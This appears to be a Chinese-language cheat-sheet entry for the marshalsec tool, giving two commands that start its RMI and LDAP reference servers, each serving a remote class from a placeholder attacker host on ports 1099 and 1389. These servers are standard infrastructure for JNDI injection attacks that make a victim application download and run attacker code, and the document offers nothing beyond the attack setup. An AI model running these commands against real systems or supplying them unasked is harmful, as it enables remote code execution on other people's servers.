#### marshalsec

开启rmi服务

```javascript
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://rmi_server_ip:rmi_port/#ExportObject 1099  
```

开启ldap服务

```javascript
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ldap_server_ip:ldap_port/#ExportObject 1389
```
